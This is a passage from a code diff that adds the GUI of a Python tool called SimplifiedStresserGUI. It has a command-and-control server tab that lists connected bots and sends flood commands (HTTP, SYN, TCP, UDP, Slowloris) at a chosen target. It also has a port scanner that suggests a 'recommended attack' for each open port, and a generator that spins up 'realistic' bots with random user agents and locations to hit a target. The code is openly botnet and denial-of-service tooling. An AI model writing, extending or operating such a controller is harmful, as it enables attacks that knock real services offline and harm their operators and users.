+        tk.Button(server_frame, text="Start C2 Server", command=self.start_c2_server, bg='#334d33', fg='white').pack(side=tk.LEFT, padx=5)
+        tk.Button(server_frame, text="Stop C2 Server", command=self.stop_c2_server, bg='#4d3333', fg='white').pack(side=tk.LEFT, padx=5)
+        list_frame = tk.LabelFrame(frame, text="Connected Bots", bg='#0a0a1a', fg='white')
+        list_frame.pack(fill='both', expand=True, pady=10)
+        self.bot_tree = ttk.Treeview(list_frame, columns=('ID', 'IP', 'OS', 'Arch', 'Priv', 'Location', 'Last Seen'), show='headings')
+        for col in self.bot_tree['columns']:
+            self.bot_tree.heading(col, text=col)
+        self.bot_tree.pack(fill='both', expand=True, padx=5, pady=5)
+        attack_frame = tk.LabelFrame(frame, text="Send Attack Command", bg='#0a0a1a', fg='white')
+        attack_frame.pack(fill='x', pady=10)
+        tk.Label(attack_frame, text="Target:", bg='#0a0a1a', fg='white').grid(row=0, column=0, padx=5, pady=5)
+        self.c2_target = tk.Entry(attack_frame, width=15, bg='#1a1a2a', fg='white')
+        self.c2_target.insert(0, "127.0.0.1")
+        self.c2_target.grid(row=0, column=1, padx=5, pady=5)
+        tk.Label(attack_frame, text="Port:", bg='#0a0a1a', fg='white').grid(row=0, column=2, padx=5, pady=5)
+        self.c2_port = tk.Entry(attack_frame, width=8, bg='#1a1a2a', fg='white')
+        self.c2_port.insert(0, "80")
+        self.c2_port.grid(row=0, column=3, padx=5, pady=5)
+        tk.Label(attack_frame, text="Type:", bg='#0a0a1a', fg='white').grid(row=0, column=4, padx=5, pady=5)
+        self.c2_attack_type = tk.StringVar(value="HTTP Flood")
+        c2_attack_types = ["HTTP Flood", "SYN Flood", "TCP Flood", "UDP Flood", "Slowloris"]
+        tk.OptionMenu(attack_frame, self.c2_attack_type, *c2_attack_types).grid(row=0, column=5, padx=5, pady=5)
+        tk.Button(attack_frame, text="Launch Attack", command=self.send_attack_command, bg='#33334d', fg='white').grid(row=0, column=6, padx=5, pady=5)
+        # Initialize the bot list update
+        self.update_bot_list()
+    def start_c2_server(self):
+        global C2_SERVER_RUNNING, C2_SERVER_THREAD
+        if C2_SERVER_RUNNING:
+            self.update_status("C2 Server is already running.")
+            return
+        try:
+            C2_SERVER_RUNNING = True
+            C2_SERVER_THREAD = threading.Thread(target=run_c2_server, daemon=True)
+            C2_SERVER_THREAD.start()
+            self.update_status(f"HTTP C2 Server starting at http://{C2_HOST}:{C2_PORT}")
+            # Start periodic updates
+            self.schedule_bot_list_update()
+        except Exception as e:
+            C2_SERVER_RUNNING = False
+            self.update_status(f"Failed to start C2 Server: {e}")
+    def stop_c2_server(self):
+        global C2_SERVER_RUNNING
+        C2_SERVER_RUNNING = False
+        self.update_status("HTTP C2 Server stopped.")
+    def schedule_bot_list_update(self):
+        """Schedule the next update of the bot list."""
+        if self.bot_list_update_job:
+            try:
+                self.root.after_cancel(self.bot_list_update_job)
+            except tk.TclError:
+                pass # Widget might have been destroyed
+        # Schedule the update every 5 seconds (adjust as needed)
+        self.bot_list_update_job = self.root.after(5000, self.update_bot_list)
+    def update_bot_list(self):
+        """Update the Treeview with the current ACTIVE_BOTS."""
+        try:
+            # Clear existing items
+            for item in self.bot_tree.get_children():
+                self.bot_tree.delete(item)
+            # Add new items
+            for bot_id, info in ACTIVE_BOTS.items():
+                self.bot_tree.insert('', tk.END, values=(
+                    bot_id, info['ip'], info['os'], info['arch'],
+                    info['priv'], info.get('location', 'Unknown'), info['last_seen']
+                ))
+        except Exception as e:
+            print(f"[GUI ERROR] Updating bot list: {e}")
+        finally:
+            # Schedule the next update
+            self.schedule_bot_list_update()
+    def send_attack_command(self):
+        target = self.c2_target.get()
+        port = self.c2_port.get()
+        attack_type = self.c2_attack_type.get()
+        if not target or not port:
+            messagebox.showerror("Error", "Target and port required!")
+            return
+        try:
+            port = int(port)
+        except ValueError:
+            messagebox.showerror("Error", "Port must be a number!")
+            return
+        SimplifiedStresserGUI.pending_command = {"cmd": "attack", "target": target, "port": port, "type": attack_type}
+        self.update_status(f"Attack command sent: {attack_type} on {target}:{port}")
+    def setup_pentest_tab(self):
+        frame = tk.Frame(self.tab_pen_test, bg='#0a0a1a')
+        frame.pack(fill='both', expand=True, padx=20, pady=20)
+        input_frame = tk.Frame(frame, bg='#0a0a1a')
+        input_frame.pack(fill='x', pady=10)
+        tk.Label(input_frame, text="Target IP/Range:", bg='#0a0a1a', fg='white').pack(side=tk.LEFT)
+        self.scan_target = tk.Entry(input_frame, width=30, bg='#1a1a2a', fg='white')
+        self.scan_target.insert(0, "127.0.0.1")
+        self.scan_target.pack(side=tk.LEFT, padx=5)
+        button_frame = tk.Frame(input_frame, bg='#0a0a1a')
+        button_frame.pack(side=tk.LEFT, padx=5)
+        self.scan_button = tk.Button(button_frame, text="Scan Open Ports", command=self.scan_ports, bg='#33334d', fg='white')
+        self.scan_button.pack(side=tk.LEFT)
+        self.stop_scan_button = tk.Button(button_frame, text="Stop Scan", command=self.stop_port_scan, bg='#4d3333', fg='white', state='disabled')
+        self.stop_scan_button.pack(side=tk.LEFT, padx=(5,0))
+        result_frame = tk.LabelFrame(frame, text="Scan Results", bg='#0a0a1a', fg='white')
+        result_frame.pack(fill='both', expand=True, pady=10)
+        self.port_tree = ttk.Treeview(result_frame, columns=('Port/Service', 'Recommended Attack'), show='headings')
+        self.port_tree.heading('Port/Service', text='Port/Service')
+        self.port_tree.heading('Recommended Attack', text='Recommended Attack')
+        tree_scrollbar_y = ttk.Scrollbar(result_frame, orient="vertical", command=self.port_tree.yview)
+        tree_scrollbar_x = ttk.Scrollbar(result_frame, orient="horizontal", command=self.port_tree.xview)
+        self.port_tree.configure(yscrollcommand=tree_scrollbar_y.set, xscrollcommand=tree_scrollbar_x.set)
+        self.port_tree.pack(side="left", fill="both", expand=True)
+        tree_scrollbar_y.pack(side="right", fill="y")
+        tree_scrollbar_x.pack(side="bottom", fill="x")
+    def scan_ports(self):
+        target_input = self.scan_target.get().strip()
+        if not target_input:
+            messagebox.showerror("Error", "Enter target IP or range!")
+            return
+        ip_list = []
+        if '-' in target_input:
+            try:
+                start_ip, end_ip = target_input.split('-')
+                if '.' not in end_ip:
+                    base_parts = start_ip.split('.')
+                    base_parts[-1] = end_ip
+                    end_ip = '.'.join(base_parts)
+                ip_list = scanner_instance.getIpAddressesFromRange(start_ip.strip(), end_ip.strip())
+                if not ip_list:
+                    raise ValueError("Invalid IP range")
+            except Exception as e:
+                messagebox.showerror("Error", f"Invalid IP range: {e}")
+                return
+        else:
+            ip_list = [target_input]
+        if self.scan_button:
+            self.scan_button.config(state='disabled', text="Scanning...")
+        if self.stop_scan_button:
+            self.stop_scan_button.config(state='normal')
+        for item in self.port_tree.get_children():
+            self.port_tree.delete(item)
+        self.update_status(f"Scanning {len(ip_list)} target(s)...")
+        self.scan_stop_event.clear()
+        self.port_scan_thread = threading.Thread(
+            target=self._run_port_scan_with_class,
+            args=(ip_list, scanner_instance.COMMON_PORTS),
+            daemon=True
+        )
+        self.port_scan_thread.start()
+    def _run_port_scan_with_class(self, ip_list, ports_to_scan):
+        all_results = []
+        try:
+            threads = []
+            for ip in ip_list:
+                if self.scan_stop_event.is_set():
+                    break
+                thread = threading.Thread(
+                    target=scanner_instance.scan_target,
+                    args=(ip, ports_to_scan, all_results, self.scan_stop_event)
+                )
+                threads.append(thread)
+                thread.start()
+            for thread in threads:
+                thread.join()
+        except Exception as e:
+            print(f"[SCAN ERROR] {e}")
+        self.root.after(0, self._update_scan_results, all_results)
+    def _update_scan_results(self, results):
+        if self.scan_button:
+            self.scan_button.config(state='normal', text="Scan Open Ports")
+        if self.stop_scan_button:
+            self.stop_scan_button.config(state='disabled')
+        for item in self.port_tree.get_children():
+            self.port_tree.delete(item)
+        for port_service, recommendation in results:
+            self.port_tree.insert('', tk.END, values=(port_service, recommendation))
+        msg = f"Scan complete. Found {len(results)} open port(s)."
+        self.update_status(msg)
+    def stop_port_scan(self):
+        self.scan_stop_event.set()
+        self.update_status("Stopping scan...")
+    def setup_bot_sim_tab(self):
+        frame = tk.Frame(self.tab_bot_sim, bg='#0a0a1a')
+        frame.pack(fill='both', expand=True, padx=20, pady=20)
+        control_frame = tk.LabelFrame(frame, text="Bot Simulation Control", bg='#0a0a1a', fg='white')
+        control_frame.pack(fill='x', pady=10)
+        tk.Button(control_frame, text="Generate 10 Realistic Bots", command=lambda: self.generate_realistic_bots(10), bg='#33334d', fg='white').pack(side=tk.LEFT, padx=5)
+        tk.Button(control_frame, text="Generate 50 Realistic Bots", command=lambda: self.generate_realistic_bots(50), bg='#33334d', fg='white').pack(side=tk.LEFT, padx=5)
+        tk.Button(control_frame, text="Generate 100 Realistic Bots", command=lambda: self.generate_realistic_bots(100), bg='#33334d', fg='white').pack(side=tk.LEFT, padx=5)
+        dist_frame = tk.LabelFrame(frame, text="Bot OS Distribution", bg='#0a0a1a', fg='white')
+        dist_frame.pack(fill='both', expand=True, pady=10)
+        canvas_frame = tk.Frame(dist_frame, bg='#0a0a1a')
+        canvas_frame.pack(fill='both', expand=True)
+        canvas = tk.Canvas(canvas_frame, bg='#0a0a1a')
+        scrollbar_v = ttk.Scrollbar(canvas_frame, orient="vertical", command=canvas.yview)
+        scrollbar_h = ttk.Scrollbar(canvas_frame, orient="horizontal", command=canvas.xview)
+        scrollable_frame = tk.Frame(canvas, bg='#0a0a1a')
+        scrollable_frame.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
+        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
+        canvas.configure(yscrollcommand=scrollbar_v.set, xscrollcommand=scrollbar_h.set)
+        for os_info in BOT_OS_TYPES:
+            row_frame = tk.Frame(scrollable_frame, bg='#0a0a1a')
+            row_frame.pack(fill='x', padx=5, pady=2)
+            tk.Label(row_frame, text=f"{os_info['name']} ({os_info['arch']})", bg='#0a0a1a', fg='white', width=30, anchor='w').pack(side=tk.LEFT)
+            tk.Label(row_frame, text=os_info['priv'], bg='#0a0a1a', fg='yellow', width=15).pack(side=tk.LEFT)
+            progress = ttk.Progressbar(row_frame, length=200, mode='determinate')
+            progress.pack(side=tk.LEFT, padx=5)
+            progress['value'] = random.randint(20, 100)
+        canvas.pack(side="left", fill="both", expand=True)
+        scrollbar_v.pack(side="right", fill="y")
+        scrollbar_h.pack(side="bottom", fill="x")
+    def generate_realistic_bots(self, count):
+        target = self.target_host.get() or "127.0.0.1"
+        port = int(self.target_port.get() or "80")
+        attack_type = self.attack_type.get()
+        weights = [5, 8, 3, 10, 12, 6, 4, 7, 3, 2, 4, 2, 3, 2, 3, 2, 6, 4, 2, 1]
+        for i in range(count):
+            bot_profile = random.choices(BOT_OS_TYPES, weights=weights, k=1)[0]
+            bot_id = generate_bot_id()
+            user_agent = get_random_user_agent()
+            location = get_random_location() if self.geo_distribution_var.get() else "Unknown"
+            bot_thread = threading.Thread(
+                target=self.simulate_bot,
+                args=(bot_id, target, port, attack_type, bot_profile, user_agent, location),
+                daemon=True
+            )
+            with self.running_bots_lock:
+                self.running_bots.add(bot_id)
+            bot_thread.start()
+            self.bot_count += 1
+        self.bot_var.set(str(self.bot_count))
+        self.update_status(f"Generated {count} realistic bots")
+    def on_closing(self):
+        print("[INFO] Closing application...")
+        if self.bot_list_update_job:
+            try:
+                self.root.after_cancel(self.bot_list_update_job)
+            except tk.TclError:
+                pass # Widget might have been destroyed
+        global C2_SERVER_RUNNING
+        C2_SERVER_RUNNING = False
+        self.udp_flooding = False
+        self.scan_stop_event.set()
+        sys.stdout = sys.__stdout__
+        self.root.destroy()
+        print("[INFO] Application closed.")
+# --- Main Execution ---
+if __name__ == "__main__":
+    try:
+        root = tk.Tk()
+        app = SimplifiedStresserGUI(root)
+        root.mainloop()
+    except Exception as e:
+        sys.stdout = sys.__stdout__
+        print(f"[FATAL ERROR] Failed to start application: {e}")
